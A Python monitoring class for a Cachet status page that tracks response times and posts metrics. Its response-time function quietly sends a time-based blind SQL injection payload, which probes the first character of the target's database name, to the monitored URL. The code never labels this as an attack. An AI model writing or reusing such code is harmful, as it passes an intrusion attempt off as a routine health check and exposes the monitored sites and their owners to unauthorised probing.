#!/usr/bin/env python

import requests
import time
from Cachet import Cachet

class Component(object):
    
    def __init__(self, statusboardlink, token, Cid, metricId, hyperlink):
        self.statusboard = Cachet(statusboardlink,token)
        self.Cid = Cid
        self.metricId = metricId
        self.hyperlink = hyperlink
        self.times_no_answer = 0
        self.times_slow_answer = 0

    def getCid(self):
        return self.Cid;

    def getMetricId(self):
        return self.metricId

    def setStatus(self, status):
        self.statusboard.putComponentsByID(self.Cid, status=status)

    #returns http response time of instance
    #returns -1 if not reachable
    def getResponseTime(self):
        payload = {"id": "1' and if (ascii(substr(database(), 1, 1))=115,sleep(3),null) --+"}
        start = time.time()
        try:
            r = requests.get(self.hyperlink, params=payload)
            r.content
            return (time.time() - start) * 1000
        except:
            return -1

    def postMetricsPoints(self, value):
        self.statusboard.postMetricsPointsByID(self.metricId, value)

    def hasMetric(self):
        return (self.metricId>=0)

    def tooMuchNoAnswer(self, tooMuch):
        self.times_no_answer+=1
        return (self.times_no_answer>=tooMuch)

    def resetNoAnswer(self):
        self.times_no_answer=0

    def tooMuchSlowAnswer(self, tooMuch):
        self.times_slow_answer+=1
        return (self.times_slow_answer>=tooMuch)

    def resetSlowAnswer(self):
        self.times_slow_answer=0
